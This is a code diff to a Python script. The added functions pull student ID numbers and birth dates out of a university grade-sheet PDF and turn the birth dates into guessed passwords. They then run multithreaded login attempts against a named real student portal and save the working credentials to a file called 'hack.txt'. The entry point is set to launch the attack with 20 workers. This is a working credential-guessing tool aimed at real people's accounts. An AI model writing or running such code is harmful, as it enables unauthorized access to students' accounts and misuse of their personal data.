@@ -179,6 +179,11 @@ def insert_images_into_excel(file_path, image_column="F", output_column="H",
     # scrape_itviec()
     # insert_images_into_excel(file_path="itviec_companies_selenium.xlsx");
 
+
+
+
+
+
 import requests
 from gtts import gTTS
 import os
@@ -306,5 +311,133 @@ def import_txt_to_anki(txt_file):
                 logging.error(f"❌ Lỗi format dòng: {line.strip()}")
 
     # ==== 📌 Chạy script ====
+
+import fitz  # PyMuPDF
+import re
+
+def extract_student_info(file_path):
+    print(f"Đang mở file: {file_path}")
+    doc = fitz.open(file_path)
+
+    full_text = ""
+    for page in doc:
+        full_text += page.get_text()
+
+    print("----- Nội dung PDF (1000 ký tự đầu) -----")
+    print(full_text[:1000])
+    print("----------------------------------------")
+
+    # Tìm tất cả MSSV (10 chữ số)
+    mssv_list = re.findall(r"\b\d{10}\b", full_text)
+    # Tìm tất cả ngày sinh (dd/mm/yyyy)
+    dob_list = re.findall(r"\b\d{2}/\d{2}/\d{4}\b", full_text)
+
+    print(f"Tìm thấy {len(mssv_list)} MSSV, {len(dob_list)} ngày sinh")
+
+    # Ghép theo thứ tự
+    formatted = []
+    for mssv, dob in zip(mssv_list, dob_list):
+        formatted.append((mssv, dob.replace("/", "")))
+
+    return formatted
+
+def save_to_txt(student_data, output_path):
+    with open(output_path, "w", encoding="utf-8") as f:
+        for mssv, dob in student_data:
+            f.write(f"{mssv}, {dob}\n")
+    print(f"Đã ghi {len(student_data)} dòng vào {output_path}")
+
+def count_lines_in_txt(file_path):
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            lines = f.readlines()
+            return len(lines)
+    except FileNotFoundError:
+        print(f"File {file_path} không tồn tại.")
+        return 0
+    except Exception as e:
+        print(f"Đã xảy ra lỗi: {e}")
+        return 0
+
+
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+LOGIN_URL = "https://ctsv.sgu.edu.vn/sinhvien/index.php"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Referer": "https://ctsv.sgu.edu.vn/",
+    "Origin": "https://ctsv.sgu.edu.vn"
+}
+
+def login_attempt(line):
+    line = line.strip()
+    if not line or "," not in line:
+        return None
+
+    try:
+        username, password = map(str.strip, line.split(","))
+        payload = {"username": username, "password": password}
+
+        response = requests.post(LOGIN_URL, data=payload, headers=HEADERS, timeout=10)
+
+        if response.status_code != 200:
+            print(f"[ERROR] {username} - HTTP {response.status_code}")
+            return "STOP"  # Để biết có lỗi server, client
+
+        if "Bạn đăng nhập thông tin không đúng" not in response.text:
+            print(f"[SUCCESS] {username}")
+            return f"{username},{password}"
+        else:
+            print(f"[FAIL] {username}")
+            return None
+
+    except Exception as e:
+        print(f"[EXCEPTION] {username} - {e}")
+        return "STOP"
+
+def multi_login(file_path="output.txt", result_file="hack.txt", max_workers=10):
+    with open(file_path, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+
+    success_lines = []
+
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_line = {executor.submit(login_attempt, line): line for line in lines}
+
+        for future in as_completed(future_to_line):
+            result = future.result()
+
+            if result == "STOP":
+                print("⛔ Dừng toàn bộ vì lỗi!")
+                break
+
+            if result:
+                success_lines.append(result)
+
+    # Ghi kết quả thành công vào file
+    with open(result_file, "a", encoding="utf-8") as f:
+        for line in success_lines:
+            f.write(f"{line}\n")
+
 if __name__ == "__main__":
-    import_txt_to_anki("cards.txt")
+    # import_txt_to_anki("cards.txt")
+
+
+
+    # file_path = "HK20231_BangDiemTongHopHocKy.pdf"
+    # output_file = "output.txt"
+    # student_data = extract_student_info(file_path)
+    # save_to_txt(student_data, output_file)
+    # student_data = extract_student_info(file_path)
+    #
+    # for mssv, dob in student_data:
+    #     print(f"{mssv}, {dob}")
+    #
+    # # Đếm số dòng trong file
+    # num_lines = count_lines_in_txt("output.txt")
+    # print(f"Số dòng trong file {file_path}: {num_lines}")
+
+    # try_login_and_save()
+    multi_login(max_workers=20)
